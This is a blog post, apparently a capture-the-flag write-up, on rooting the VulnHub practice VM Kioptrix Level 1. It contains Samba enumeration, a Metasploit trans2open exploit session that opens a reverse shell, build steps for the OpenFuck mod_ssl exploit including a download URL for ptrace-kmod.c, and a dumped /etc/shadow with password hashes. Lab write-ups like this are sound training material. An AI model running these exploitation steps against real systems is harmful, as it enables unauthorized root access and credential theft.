---
layout: post
title: "Kioptrix: Level 1"
date: 2015-05-10 13:34:07 +0200
comments: true
categories: [vulnhub, kioptrix]
---
Image: [Kioptrix: Level 1 (#1)](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

Nmap output:
{% codeblock %}
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
1024/tcp open  status      1 (RPC #100024)
{% endcodeblock %}

Enumeration of Samba:
{% codeblock %}
root@kali32:/usr/share/exploitdb# nmblookup -A 192.168.0.26
Looking up status of 192.168.0.26
        KIOPTRIX        <00> -         B <ACTIVE> 
        KIOPTRIX        <03> -         B <ACTIVE> 
        KIOPTRIX        <20> -         B <ACTIVE> 
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
        MYGROUP         <00> - <GROUP> B <ACTIVE> 
        MYGROUP         <1d> -         B <ACTIVE> 
        MYGROUP         <1e> - <GROUP> B <ACTIVE> 

        MAC Address = 00-00-00-00-00-00

root@kali32:/usr/share/exploitdb# smbclient -L\\ -I 192.168.0.26
Enter root's password: 
Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX
{% endcodeblock %}

The service is running with the root privileges and we can use exploit in Metasploit to obtain root account:
{% codeblock %}
msf > use exploit/linux/samba/trans2open
msf exploit(trans2open) > setg RHOST 192.168.80.141
RHOST => 192.168.80.141
msf exploit(trans2open) > exploit

[*] Started reverse handler on 192.168.80.137:4444
[*] Trying return address 0xbffffdfc...
[*] Trying return address 0xbffffcfc...
[*] Trying return address 0xbffffbfc...
[*] Trying return address 0xbffffafc...
[*] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.141:1026) at 2015-04-27 06:43:53 +0200
{% endcodeblock %}

Because Apache is vulnerable, there is another solution. Nikto reports something interesting:
{% codeblock %}
mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
{% endcodeblock %}

Web server signature:
{% codeblock %}
Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
{% endcodeblock %}

In exploitdb we find:
{% codeblock %}
Apache OpenSSL - Remote Exploit (Multiple Targets) (OpenFuckV2.c) | /linux/remote/764.c
{% endcodeblock %}

Because the exploit is pretty old, we need to update it with these [steps](https://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/):
{% codeblock %}
#include <openssl/rc4.h>
#include <openssl/md5.h>
...
http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
...
# gcc -o OpenFuck 764.c -lcrypto
{% endcodeblock %}

Finally we run the exploit and cat /etc/shadow with the root privileges.
{% codeblock %}
cat /etc/shadow
root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
bin:*:14513:0:99999:7:::
daemon:*:14513:0:99999:7:::
adm:*:14513:0:99999:7:::
lp:*:14513:0:99999:7:::
sync:*:14513:0:99999:7:::
shutdown:*:14513:0:99999:7:::
halt:*:14513:0:99999:7:::
mail:*:14513:0:99999:7:::
news:*:14513:0:99999:7:::
uucp:*:14513:0:99999:7:::
operator:*:14513:0:99999:7:::
games:*:14513:0:99999:7:::
gopher:*:14513:0:99999:7:::
ftp:*:14513:0:99999:7:::
nobody:*:14513:0:99999:7:::
mailnull:!!:14513:0:99999:7:::
rpm:!!:14513:0:99999:7:::
xfs:!!:14513:0:99999:7:::
rpc:!!:14513:0:99999:7:::
rpcuser:!!:14513:0:99999:7:::
nfsnobody:!!:14513:0:99999:7:::
nscd:!!:14513:0:99999:7:::
ident:!!:14513:0:99999:7:::
radvd:!!:14513:0:99999:7:::
postgres:!!:14513:0:99999:7:::
apache:!!:14513:0:99999:7:::
squid:!!:14513:0:99999:7:::
pcap:!!:14513:0:99999:7:::
john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
{% endcodeblock %}
